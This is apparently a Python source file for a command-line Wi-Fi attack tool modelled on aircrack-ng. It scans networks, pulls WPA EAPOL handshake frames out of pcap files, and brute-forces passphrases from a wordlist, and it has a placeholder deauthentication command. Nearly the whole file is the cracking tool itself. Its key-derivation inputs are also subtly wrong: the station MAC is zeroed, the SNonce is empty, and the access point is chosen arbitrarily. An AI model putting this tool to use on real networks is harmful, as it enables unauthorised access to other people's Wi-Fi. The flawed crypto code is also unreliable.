import asyncio
import base64
import binascii
import hashlib
import hmac
import json
import os
import platform
import re
import struct
import subprocess
import sys
import time
from datetime import datetime
from typing import Dict, List, Optional, Tuple
import click
from rich.console import Console
from rich.table import Table
from tqdm import tqdm
console = Console()
def now() -> str:
    return datetime.now().isoformat()
def run_cmd(cmd: List[str]) -> Tuple[int, str]:
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, encoding="utf-8", errors="ignore")
        return r.returncode, r.stdout
    except Exception as e:
        return 1, str(e)
class Handshake:
    def __init__(self, ssid: str, ap_mac: bytes, sta_mac: bytes, anonce: bytes, snonce: bytes, mic: bytes, eapol: bytes, keyver: int):
        self.ssid = ssid
        self.ap_mac = ap_mac
        self.sta_mac = sta_mac
        self.anonce = anonce
        self.snonce = snonce
        self.mic = mic
        self.eapol = eapol
        self.keyver = keyver
class AP:
    def __init__(self, bssid: str, ssid: str, channel: int = 0, power: int = 0, encryption: str = ""):
        self.bssid = bssid
        self.ssid = ssid
        self.channel = channel
        self.power = power
        self.encryption = encryption
        self.stations: List[str] = []
        self.handshake = False
class Station:
    def __init__(self, mac: str, bssid: str = "", power: int = 0, probes: List[str] = None):
        self.mac = mac
        self.bssid = bssid
        self.power = power
        self.probes = probes or []
class PyAircrack:
    def __init__(self):
        self.handshakes: List[Handshake] = []
        self.aps: Dict[str, AP] = {}
        self.stations: Dict[str, Station] = {}
    def scan_wifi(self):
        if platform.system() == "Windows":
            self._scan_windows()
        else:
            self._scan_linux()
    def _scan_windows(self):
        code, out = run_cmd(["netsh", "wlan", "show", "networks", "mode=bssid"])
        if code != 0:
            console.print(f"[red][!] netsh failed: {out}[/red]")
            return
        ssid = ""
        auth = ""
        bssid = ""
        channel = ""
        signal = ""
        for line in out.splitlines():
            line = line.strip()
            if line.startswith("SSID"):
                ssid = line.split(":", 1)[1].strip() if ":" in line else ""
            elif line.startswith("Authentication"):
                auth = line.split(":", 1)[1].strip() if ":" in line else ""
            elif line.startswith("BSSID"):
                bssid = line.split(":", 1)[1].strip() if ":" in line else ""
            elif line.startswith("Channel"):
                channel = line.split(":", 1)[1].strip() if ":" in line else ""
            elif line.startswith("Signal"):
                signal = line.split(":", 1)[1].strip() if ":" in line else ""
                if ssid and bssid:
                    ap = AP(bssid, ssid, int(channel) if channel.isdigit() else 0, self._parse_signal(signal), auth)
                    self.aps[bssid] = ap
    def _parse_signal(self, s: str) -> int:
        m = re.search(r"(\d+)", s)
        return int(m.group(1)) if m else 0
    def _scan_linux(self):
        console.print("[yellow][*] Linux scan: install aircrack-ng for monitor mode, or use iw/iwlist[/yellow]")
        code, out = run_cmd(["iw", "dev"])
        console.print(f"[cyan]{out}[/cyan]")
    def print_scan(self):
        table = Table(title="Wi-Fi Scan Results")
        table.add_column("BSSID", style="cyan")
        table.add_column("SSID", style="green")
        table.add_column("Channel", style="yellow")
        table.add_column("Signal", style="magenta")
        table.add_column("Encryption", style="red")
        for ap in self.aps.values():
            table.add_row(ap.bssid, ap.ssid, str(ap.channel), f"{ap.power}%", ap.encryption)
        console.print(table)
    def read_pcap(self, path: str):
        try:
            from scapy.all import rdpcap, Dot11, Dot11Beacon, Dot11Elt, Dot11Auth, Dot11AssoReq, Dot11ProbeResp, Raw
            packets = rdpcap(path)
        except Exception as e:
            console.print(f"[red][!] scapy failed: {e}. pip install scapy[/red]")
            return
        for pkt in packets:
            if pkt.haslayer(Dot11):
                self._process_dot11(pkt)
            if pkt.haslayer(Raw):
                self._process_eapol(pkt[Raw].load)
    def _process_dot11(self, pkt):
        try:
            from scapy.all import Dot11, Dot11Beacon, Dot11Elt, Dot11AssoReq, Dot11ProbeResp
            if pkt.haslayer(Dot11Beacon):
                bssid = self._mac_str(pkt[Dot11].addr3)
                ssid = ""
                channel = 0
                crypto = set()
                cap = pkt[Dot11Beacon].network_stats()
                ssid = cap.get("ssid", "")
                channel = cap.get("channel", 0)
                crypto = cap.get("crypto", set())
                enc = "/".join(crypto) if crypto else ""
                if bssid not in self.aps:
                    self.aps[bssid] = AP(bssid, ssid, channel, 0, enc)
                else:
                    self.aps[bssid].ssid = ssid or self.aps[bssid].ssid
                    self.aps[bssid].channel = channel or self.aps[bssid].channel
                    self.aps[bssid].encryption = enc or self.aps[bssid].encryption
            elif pkt.haslayer(Dot11AssoReq) or pkt.haslayer(Dot11ProbeResp):
                bssid = self._mac_str(pkt[Dot11].addr3)
                if bssid in self.aps:
                    ssid = ""
                    p = pkt[Dot11AssoReq] if pkt.haslayer(Dot11AssoReq) else pkt[Dot11ProbeResp]
                    if p.haslayer(Dot11Elt):
                        ssid = p[Dot11Elt].info.decode("utf-8", errors="ignore")
                    self.aps[bssid].ssid = ssid or self.aps[bssid].ssid
        except Exception:
            pass
    def _process_eapol(self, raw: bytes):
        if len(raw) < 99:
            return
        if raw[0:2] != b"\x88\x8e" and raw[0:2] != b"\xaa\xaa\x03\x00\x00\x00\x88\x8e":
            if raw[6:8] == b"\x88\x8e":
                raw = raw[6:]
            elif raw[12:14] == b"\x88\x8e":
                raw = raw[12:]
            elif raw[14:16] == b"\x88\x8e":
                raw = raw[14:]
            elif b"\x88\x8e" in raw[:32]:
                idx = raw.index(b"\x88\x8e")
                raw = raw[idx:]
            else:
                return
        if len(raw) < 99:
            return
        ver = raw[0]
        ptype = raw[1]
        if ptype != 3:
            return
        key_info = struct.unpack(">H", raw[5:7])[0]
        keyver = key_info & 0x07
        key_len = struct.unpack(">H", raw[7:9])[0]
        replay = raw[9:17]
        nonce = raw[17:49]
        mic = raw[81:97]
        data_len = struct.unpack(">H", raw[97:99])[0]
        eapol_frame = raw[:81] + b"\x00" * 16 + raw[97:]
        ap_mac = b"\x00\x00\x00\x00\x00\x00"
        sta_mac = b"\x00\x00\x00\x00\x00\x00"
        ssid = ""
        for ap in self.aps.values():
            ssid = ap.ssid
            ap_mac = self._mac_bytes(ap.bssid)
            break
        h = Handshake(ssid, ap_mac, sta_mac, nonce, b"", mic, eapol_frame, keyver)
        self.handshakes.append(h)
        for ap in self.aps.values():
            if ap.bssid == self._mac_str(ap_mac):
                ap.handshake = True
    def _mac_str(self, mac) -> str:
        if isinstance(mac, str):
            return mac.lower()
        return ":".join(f"{b:02x}" for b in mac).lower()
    def _mac_bytes(self, mac: str) -> bytes:
        return bytes(int(x, 16) for x in mac.split(":"))
    def print_dump(self):
        ap_table = Table(title="Access Points")
        ap_table.add_column("BSSID", style="cyan")
        ap_table.add_column("SSID", style="green")
        ap_table.add_column("Channel", style="yellow")
        ap_table.add_column("Encryption", style="red")
        ap_table.add_column("Handshake", style="magenta")
        for ap in self.aps.values():
            ap_table.add_row(ap.bssid, ap.ssid, str(ap.channel), ap.encryption, "Yes" if ap.handshake else "No")
        console.print(ap_table)
        if self.handshakes:
            console.print(f"[green][+] {len(self.handshakes)} EAPOL frame(s) found[/green]")
    def crack(self, wordlist: str, ssid: Optional[str] = None):
        if not self.handshakes:
            console.print("[red][!] No handshakes loaded. Use dump first.[/red]")
            return
        target_hs = self.handshakes[0]
        if ssid:
            target_hs.ssid = ssid
        elif not target_hs.ssid:
            console.print("[red][!] SSID unknown. Use --ssid[/red]")
            return
        console.print(f"[cyan][*] Cracking WPA for SSID: {target_hs.ssid}[/cyan]")
        words = []
        with open(wordlist, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                line = line.strip()
                if line:
                    words.append(line)
        total = len(words)
        console.print(f"[cyan][*] Wordlist: {total} words | Threads: using hashlib PBKDF2[/cyan]")
        found = None
        pbar = tqdm(total=total, unit="words", desc="crack", ncols=80)
        start = time.time()
        for word in words:
            if self._check_password(target_hs, word):
                found = word
                break
            pbar.update(1)
        pbar.close()
        elapsed = time.time() - start
        if found:
            console.print(f"[bold green][+] KEY FOUND: {found} ({elapsed:.2f}s)[/bold green]")
        else:
            console.print(f"[yellow][-] Key not found ({elapsed:.2f}s)[/yellow]")
    def _check_password(self, hs: Handshake, password: str) -> bool:
        try:
            pmk = hashlib.pbkdf2_hmac("sha1", password.encode("utf-8"), hs.ssid.encode("utf-8"), 4096, 32)
            ptk = self._make_ptk(pmk, hs.ap_mac, hs.sta_mac, hs.anonce, hs.snonce)
            kck = ptk[:16]
            if hs.keyver == 1:
                mic_calc = hmac.new(kck, hs.eapol, hashlib.md5).digest()[:16]
            else:
                mic_calc = hmac.new(kck, hs.eapol, hashlib.sha1).digest()[:16]
            return mic_calc == hs.mic
        except Exception:
            return False
    def _make_ptk(self, pmk: bytes, amac: bytes, smac: bytes, anonce: bytes, snonce: bytes) -> bytes:
        a = min(amac, smac)
        b = max(amac, smac)
        c = min(anonce, snonce)
        d = max(anonce, snonce)
        data = b"Pairwise key expansion" + b"\x00" + a + b + c + d + b"\x00"
        ptk = b""
        for i in range(4):
            ptk += hmac.new(pmk, data + bytes([i]), hashlib.sha1).digest()
        return ptk[:48]
@click.group()
def cli():
    pass
@cli.command()
def scan():
    tool = PyAircrack()
    tool.scan_wifi()
    tool.print_scan()
@cli.command()
@click.option("-r", "--read", "pcap", required=True, help="PCAP file to read")
def dump(pcap):
    tool = PyAircrack()
    tool.read_pcap(pcap)
    tool.print_dump()
@cli.command()
@click.option("-w", "--wordlist", required=True, help="Wordlist file")
@click.option("-r", "--read", "pcap", required=True, help="PCAP file with handshake")
@click.option("-e", "--ssid", help="Target SSID (if not auto-detected)")
def crack(wordlist, pcap, ssid):
    tool = PyAircrack()
    tool.read_pcap(pcap)
    tool.crack(wordlist, ssid)
@cli.command()
def deauth():
    console.print("[yellow][*] Deauth requires monitor mode + Linux with aircrack-ng drivers[/yellow]")
    console.print("[yellow]    On Windows without admin, this is not supported.[/yellow]")
if __name__ == "__main__":
    cli()
